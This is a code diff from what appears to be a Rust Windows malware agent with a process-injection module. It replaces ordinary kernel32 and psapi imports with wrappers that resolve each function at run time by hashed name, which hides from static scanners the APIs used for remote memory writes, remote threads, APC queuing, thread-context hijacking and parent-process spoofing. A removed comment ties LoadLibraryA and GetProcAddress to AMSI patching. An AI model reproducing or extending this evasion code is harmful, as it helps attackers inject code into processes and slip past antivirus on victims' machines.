@@ -120,46 +120,315 @@ pub struct CONTEXT {
 
 // --- IMPORTS ---
 
-#[link(name = "kernel32")]
-extern "system" {
-    pub fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) -> HANDLE;
-    pub fn VirtualAlloc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID; 
-    pub fn VirtualAllocEx(h: HANDLE, lp: LPVOID, dw: SIZE_T, fl: DWORD, flP: DWORD) -> LPVOID;
-    pub fn WriteProcessMemory(h: HANDLE, lp: LPVOID, b: *const c_void, n: SIZE_T, w: *mut SIZE_T) -> BOOL;
-    pub fn ReadProcessMemory(h: HANDLE, lp: LPVOID, b: *mut c_void, n: SIZE_T, w: *mut SIZE_T) -> BOOL; 
-    pub fn VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: LPDWORD) -> BOOL;
-    pub fn VirtualProtectEx(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: LPDWORD) -> BOOL;
-    pub fn QueueUserAPC(pfnAPC: *const c_void, hThread: HANDLE, dwData: usize) -> DWORD;
-    pub fn ResumeThread(hThread: HANDLE) -> DWORD;
-    pub fn SuspendThread(hThread: HANDLE) -> DWORD;
-    pub fn GetThreadContext(hThread: HANDLE, lpContext: *mut CONTEXT) -> BOOL;
-    pub fn SetThreadContext(hThread: HANDLE, lpContext: *const CONTEXT) -> BOOL;
-    pub fn CloseHandle(h: HANDLE) -> BOOL;
-    pub fn CreateProcessA(lpAppName: LPSTR, lpCmdLine: LPSTR, lpProcAttr: *mut c_void, lpThreadAttr: *mut c_void, bInherit: BOOL, dwFlags: DWORD, lpEnv: *mut c_void, lpDir: LPSTR, lpStartup: *mut STARTUPINFOA, lpProcInfo: *mut PROCESS_INFORMATION) -> BOOL;
-    pub fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) -> HANDLE;
-    pub fn Thread32First(hSnapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL;
-    pub fn Thread32Next(hSnapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL;
-    pub fn OpenThread(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwThreadId: DWORD) -> HANDLE;
-    pub fn GetLastError() -> DWORD;
-    pub fn CreateThread(lpThreadAttributes: *mut c_void, dwStackSize: SIZE_T, lpStartAddress: LPVOID, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD) -> HANDLE;
-    pub fn CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: *mut c_void, dwStackSize: SIZE_T, lpStartAddress: LPVOID, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD) -> HANDLE;
-    pub fn WaitForSingleObject(hHandle: HANDLE, dwMilliseconds: DWORD) -> DWORD;
-
-    // Advanced / Spoofing APIs
-    pub fn InitializeProcThreadAttributeList(lpAttributeList: *mut c_void, dwAttributeCount: DWORD, dwFlags: DWORD, lpSize: *mut SIZE_T) -> BOOL;
-    pub fn UpdateProcThreadAttribute(lpAttributeList: *mut c_void, dwFlags: DWORD, Attribute: usize, lpValue: *const c_void, cbSize: SIZE_T, lpPreviousValue: *mut c_void, lpReturnSize: *mut SIZE_T) -> BOOL;
-    pub fn DeleteProcThreadAttributeList(lpAttributeList: *mut c_void);
-    pub fn GetModuleHandleA(lpModuleName: LPSTR) -> HANDLE;
-    
-    // [NEW] Added for AMSI patching
-    pub fn LoadLibraryA(lpLibFileName: LPCSTR) -> HMODULE;
-    pub fn GetProcAddress(hModule: HMODULE, lpProcName: LPCSTR) -> LPVOID;
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) -> HANDLE {
+    type F = unsafe extern "system" fn(DWORD, BOOL, DWORD) -> HANDLE;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenProcess")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(dwDesiredAccess, bInheritHandle, dwProcessId) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn VirtualAlloc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID {
+    type F = unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualAlloc")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(lpAddress, dwSize, flAllocationType, flProtect) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn VirtualAllocEx(h: HANDLE, lp: LPVOID, dw: SIZE_T, fl: DWORD, flP: DWORD) -> LPVOID {
+    type F = unsafe extern "system" fn(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualAllocEx")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(h, lp, dw, fl, flP) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn WriteProcessMemory(h: HANDLE, lp: LPVOID, b: *const c_void, n: SIZE_T, w: *mut SIZE_T) -> BOOL {
+    type F = unsafe extern "system" fn(HANDLE, LPVOID, *const c_void, SIZE_T, *mut SIZE_T) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"WriteProcessMemory")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(h, lp, b, n, w) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn ReadProcessMemory(h: HANDLE, lp: LPVOID, b: *mut c_void, n: SIZE_T, w: *mut SIZE_T) -> BOOL {
+    type F = unsafe extern "system" fn(HANDLE, LPVOID, *mut c_void, SIZE_T, *mut SIZE_T) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ReadProcessMemory")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(h, lp, b, n, w) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: LPDWORD) -> BOOL {
+    type F = unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, LPDWORD) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtect")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(lpAddress, dwSize, flNewProtect, lpflOldProtect) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn VirtualProtectEx(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: LPDWORD) -> BOOL {
+    type F = unsafe extern "system" fn(HANDLE, LPVOID, SIZE_T, DWORD, LPDWORD) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtectEx")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn QueueUserAPC(pfnAPC: *const c_void, hThread: HANDLE, dwData: usize) -> DWORD {
+    type F = unsafe extern "system" fn(*const c_void, HANDLE, usize) -> DWORD;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"QueueUserAPC")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(pfnAPC, hThread, dwData) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn ResumeThread(hThread: HANDLE) -> DWORD {
+    type F = unsafe extern "system" fn(HANDLE) -> DWORD;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ResumeThread")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hThread) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn SuspendThread(hThread: HANDLE) -> DWORD {
+    type F = unsafe extern "system" fn(HANDLE) -> DWORD;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SuspendThread")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hThread) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn GetThreadContext(hThread: HANDLE, lpContext: *mut CONTEXT) -> BOOL {
+    type F = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetThreadContext")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hThread, lpContext) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn SetThreadContext(hThread: HANDLE, lpContext: *const CONTEXT) -> BOOL {
+    type F = unsafe extern "system" fn(HANDLE, *const CONTEXT) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SetThreadContext")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hThread, lpContext) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn CloseHandle(h: HANDLE) -> BOOL {
+    type F = unsafe extern "system" fn(HANDLE) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseHandle")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(h) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn CreateProcessA(lpAppName: LPSTR, lpCmdLine: LPSTR, lpProcAttr: *mut c_void, lpThreadAttr: *mut c_void, bInherit: BOOL, dwFlags: DWORD, lpEnv: *mut c_void, lpDir: LPSTR, lpStartup: *mut STARTUPINFOA, lpProcInfo: *mut PROCESS_INFORMATION) -> BOOL {
+    type F = unsafe extern "system" fn(LPSTR, LPSTR, *mut c_void, *mut c_void, BOOL, DWORD, *mut c_void, LPSTR, *mut STARTUPINFOA, *mut PROCESS_INFORMATION) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateProcessA")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(lpAppName, lpCmdLine, lpProcAttr, lpThreadAttr, bInherit, dwFlags, lpEnv, lpDir, lpStartup, lpProcInfo) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) -> HANDLE {
+    type F = unsafe extern "system" fn(DWORD, DWORD) -> HANDLE;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateToolhelp32Snapshot")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(dwFlags, th32ProcessID) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn Thread32First(hSnapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL {
+    type F = unsafe extern "system" fn(HANDLE, *mut THREADENTRY32) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"Thread32First")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hSnapshot, lpte) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn Thread32Next(hSnapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL {
+    type F = unsafe extern "system" fn(HANDLE, *mut THREADENTRY32) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"Thread32Next")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hSnapshot, lpte) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn OpenThread(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwThreadId: DWORD) -> HANDLE {
+    type F = unsafe extern "system" fn(DWORD, BOOL, DWORD) -> HANDLE;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenThread")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(dwDesiredAccess, bInheritHandle, dwThreadId) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn GetLastError() -> DWORD {
+    type F = unsafe extern "system" fn() -> DWORD;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetLastError")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f() }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn CreateThread(lpThreadAttributes: *mut c_void, dwStackSize: SIZE_T, lpStartAddress: LPVOID, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD) -> HANDLE {
+    type F = unsafe extern "system" fn(*mut c_void, SIZE_T, LPVOID, LPVOID, DWORD, LPDWORD) -> HANDLE;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateThread")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: *mut c_void, dwStackSize: SIZE_T, lpStartAddress: LPVOID, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD) -> HANDLE {
+    type F = unsafe extern "system" fn(HANDLE, *mut c_void, SIZE_T, LPVOID, LPVOID, DWORD, LPDWORD) -> HANDLE;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateRemoteThread")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn WaitForSingleObject(hHandle: HANDLE, dwMilliseconds: DWORD) -> DWORD {
+    type F = unsafe extern "system" fn(HANDLE, DWORD) -> DWORD;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"WaitForSingleObject")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hHandle, dwMilliseconds) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn InitializeProcThreadAttributeList(lpAttributeList: *mut c_void, dwAttributeCount: DWORD, dwFlags: DWORD, lpSize: *mut SIZE_T) -> BOOL {
+    type F = unsafe extern "system" fn(*mut c_void, DWORD, DWORD, *mut SIZE_T) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"InitializeProcThreadAttributeList")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(lpAttributeList, dwAttributeCount, dwFlags, lpSize) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn UpdateProcThreadAttribute(lpAttributeList: *mut c_void, dwFlags: DWORD, Attribute: usize, lpValue: *const c_void, cbSize: SIZE_T, lpPreviousValue: *mut c_void, lpReturnSize: *mut SIZE_T) -> BOOL {
+    type F = unsafe extern "system" fn(*mut c_void, DWORD, usize, *const c_void, SIZE_T, *mut c_void, *mut SIZE_T) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"UpdateProcThreadAttribute")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(lpAttributeList, dwFlags, Attribute, lpValue, cbSize, lpPreviousValue, lpReturnSize) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn DeleteProcThreadAttributeList(lpAttributeList: *mut c_void) {
+    type F = unsafe extern "system" fn(*mut c_void);
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DeleteProcThreadAttributeList")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(lpAttributeList) };
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn GetModuleHandleA(lpModuleName: LPSTR) -> HANDLE {
+    type F = unsafe extern "system" fn(LPSTR) -> HANDLE;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleHandleA")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(lpModuleName) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn LoadLibraryA(lpLibFileName: LPCSTR) -> HMODULE {
+    type F = unsafe extern "system" fn(LPCSTR) -> HMODULE;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"LoadLibraryA")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(lpLibFileName) }
+}
+/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+pub unsafe fn GetProcAddress(hModule: HMODULE, lpProcName: LPCSTR) -> LPVOID {
+    type F = unsafe extern "system" fn(HMODULE, LPCSTR) -> LPVOID;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetProcAddress")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hModule, lpProcName) }
 }
 
 // PSAPI Imports
-#[link(name = "psapi")]
-extern "system" {
-    pub fn EnumProcessModulesEx(hProcess: HANDLE, lphModule: *mut HMODULE, cb: DWORD, lpcbNeeded: *mut DWORD, dwFilterFlag: DWORD) -> BOOL;
-    pub fn GetModuleBaseNameA(hProcess: HANDLE, hModule: HMODULE, lpBaseName: LPSTR, nSize: DWORD) -> DWORD;
-    pub fn GetModuleInformation(hProcess: HANDLE, hModule: HMODULE, lpmodinfo: *mut MODULEINFO, cb: DWORD) -> BOOL;
+/// Lazily resolved from psapi.dll by name hash (import-table hygiene).
+pub unsafe fn EnumProcessModulesEx(hProcess: HANDLE, lphModule: *mut HMODULE, cb: DWORD, lpcbNeeded: *mut DWORD, dwFilterFlag: DWORD) -> BOOL {
+    type F = unsafe extern "system" fn(HANDLE, *mut HMODULE, DWORD, *mut DWORD, DWORD) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"psapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"EnumProcessModulesEx")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hProcess, lphModule, cb, lpcbNeeded, dwFilterFlag) }
+}
+/// Lazily resolved from psapi.dll by name hash (import-table hygiene).
+pub unsafe fn GetModuleBaseNameA(hProcess: HANDLE, hModule: HMODULE, lpBaseName: LPSTR, nSize: DWORD) -> DWORD {
+    type F = unsafe extern "system" fn(HANDLE, HMODULE, LPSTR, DWORD) -> DWORD;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"psapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleBaseNameA")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hProcess, hModule, lpBaseName, nSize) }
+}
+/// Lazily resolved from psapi.dll by name hash (import-table hygiene).
+pub unsafe fn GetModuleInformation(hProcess: HANDLE, hModule: HMODULE, lpmodinfo: *mut MODULEINFO, cb: DWORD) -> BOOL {
+    type F = unsafe extern "system" fn(HANDLE, HMODULE, *mut MODULEINFO, DWORD) -> BOOL;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"psapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleInformation")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hProcess, hModule, lpmodinfo, cb) }
 }
